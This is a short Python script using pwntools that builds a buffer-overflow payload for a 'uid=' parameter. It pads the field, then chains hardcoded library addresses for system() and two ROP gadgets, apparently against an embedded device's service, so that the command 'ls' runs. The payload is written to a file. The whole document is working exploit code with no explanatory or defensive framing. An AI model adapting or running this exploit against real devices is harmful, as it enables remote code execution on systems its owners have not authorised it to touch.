from pwn import *

system_addr=0x76738000+0x53200
gadget1=0x76738000+0x000158C8
gadget2=0x76738000+0x000159CC 
addr=0x76fff218-0x300
f=open("payload","wb")
data='uid='
data+='A'*(0x3f1-0x24)+p32(system_addr-1)+p32(addr)*4+p32(gadget2)+p32(addr)*2+p32(addr)+p32(gadget1)+p32(addr)*4+'ls\x00'
f.write(data)
f.close()
